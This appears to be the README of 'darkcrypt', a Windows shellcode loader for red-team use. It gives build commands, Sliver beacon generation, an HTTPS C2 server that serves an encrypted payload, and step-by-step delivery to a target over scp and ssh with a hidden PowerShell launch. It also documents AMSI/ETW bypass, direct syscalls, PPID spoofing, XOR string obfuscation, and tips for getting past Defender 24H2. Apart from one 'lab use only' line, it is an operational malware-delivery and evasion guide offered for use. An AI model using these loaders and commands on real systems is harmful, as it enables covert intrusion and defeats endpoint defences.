<div align="center">

# darkcrypt

**C shellcode loader for Windows x64. Direct syscalls, HWBP AMSI/ETW bypass, HTTPS C2, PPID spoof, Donut in-memory stage.**

</div>

---

> Authorized lab use only (snapshot VMs, HTB, Vulnlab). You own your use.

## What it does

Fetches an AES-256-CBC + HMAC-SHA256 payload over WinHTTP (TLS by default), verifies and decrypts in memory via Windows CNG, spawns a suspended `notepad.exe` reparented onto `explorer.exe`, and dispatches the shellcode through a direct-syscall `NtQueueApcThread` trampoline (Halos Gate). ETW and AMSI are silenced via hardware breakpoints in both the loader and the beacon's host.

**~63 KB release binary, IOC-scanner clean.** All sensitive strings are XOR-encoded in source and decoded onto stack buffers at point of use; `tools/check_iocs.py` enforces this.

A paired Donut-wrapped stager (`make stager` + `scripts/donut-wrap.sh`) delivers the loader in-memory — only the stager touches disk.

## Build

```bash
sudo pacman -S mingw-w64-gcc           # or your distro equivalent
make release                           # → build/loader.exe (stripped, ~63 KB)
make stager                            # → build/stager.exe (~54 KB)
python3 tools/check_iocs.py build/loader.exe   # expect PASS
```

## Usage

### 1. Generate shellcode

```
sliver > generate --mtls <C2>:8443 --os windows --arch amd64 --format shellcode \
                  --save /tmp/beacon.bin --shellcode-exitopt 3 --shellcode-entropy 3 \
                  --skip-symbols
```

### 2. Forge payload

```bash
./forge.sh /tmp/beacon.bin             # writes aes.encrypted + patches keys into src/aes-main.c
make release                           # rebuild with fresh keys
```

### 3. Stand TLS httpd on the C2

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
            -days 365 -nodes -subj "/CN=<C2>"
python3 - <<'PY'
import http.server, ssl, os
srv = http.server.HTTPServer(('0.0.0.0', 9443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('cert.pem', 'key.pem')
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
PY
```

Default C2 URL (edit in `src/aes-main.c` if your server differs): `https://<C2>:9443/aes.encrypted`.

### 4. Open listener

```
sliver > mtls -L 0.0.0.0 -l 8443
```

### 5. Deliver and fire

**Direct (loader.exe hits disk):**
```bash
scp build/loader.exe user@target:loader.exe
ssh user@target 'powershell -Command "Start-Process C:\Users\user\loader.exe -WindowStyle Hidden"'
```

**In-memory (only stager hits disk):**
```bash
./scripts/donut-wrap.sh                     # → build/loader.bin (Donut blob)
scp build/loader.bin  user@c2:update.bin    # serve alongside aes.encrypted
scp build/stager.exe  user@target:stager.exe
ssh user@target 'powershell -Command "Start-Process C:\Users\user\stager.exe -WindowStyle Hidden"'
```

Session lands on Sliver in a few seconds either way. Sysmon Event 1 on the spawned `notepad.exe` shows `ParentProcessId` = explorer (PPID spoof live by default).

## Modes

- `make release` — stripped ~63 KB loader for ops.
- `make debug` — DBG_PRINTF to stderr, ~328 KB. Lab only (Nt* names in .rdata).
- `make release-nocrt` — sub-50 KB, no CRT linkage.
- `make stager` — ~54 KB Donut-blob runner (in-memory delivery).

## Gotchas

- **Host lifetime.** Host must block (message pump). `notepad.exe` works; `RuntimeBroker.exe` dies in ~5s.
- **Third-APC race.** `remote_hwbp_finish_amsi()` races beacon mTLS in release builds. `inject.c` holds a 1s `WaitForSingleObject` to let the handshake settle.
- **KERNELBASE forwarders.** `InitializeProcThreadAttributeList` / `UpdateProcThreadAttribute` / `DeleteProcThreadAttributeList` are forwarder exports to KERNELBASE on modern Windows — `peb_find_export()` returns the forwarder string, calling it = `0xC0000005`. `inject.c` re-resolves these from `peb_get_module(L"KERNELBASE.dll")`.
- **`self_delete()` is a no-op on 24H2.** The loader exits cleanly but the file stays on disk. Use the Donut stager for no-loader-on-disk delivery.
- **Signatured .NET via `execute-assembly -i`.** HWBP AMSI returns CLEAN as told, but Defender 24H2 ships `Behavior:Win32/AMSI_Patch_T.B12` which trips on CLEAN-on-dirty. Use sacrificial-process mode (Sliver default, no `-i`) or build recon tools unsignatured.
- **Payload cap.** `MAX_PAYLOAD_SIZE` in `src/http.c` is 32 MB. Bump for larger payloads.
- **Session 0.** Loader launched via OpenSSH's `sshd` runs in Session 0 — no desktop. `sliver > migrate --pid <explorer_pid>` before screenshotting.
- **LSP red squiggles.** Clang can't find `windows.h` cross-compiling. Trust `make`.
- **Snapshot VMs.** Start every run from a clean snapshot.

## Cross-port

| Build             | Size    | Imports                | IOC | Win11 24H2 Defender |
|-------------------|---------|------------------------|-----|---------------------|
| darkcrypt (C)     | 63 KB   | kernel32, ntdll        | 0   | ✓                   |
| darkcrypt stager  | 54 KB   | kernel32, ntdll        | 0   | ✓                   |
| darkcrypt-cs      | 37 KB   | n/a (.NET)             | n/a | ✓                   |
| darkcrypt-rs      | 37.8 KB | KERNEL32 only, 8 names | 1   | ✓                   |
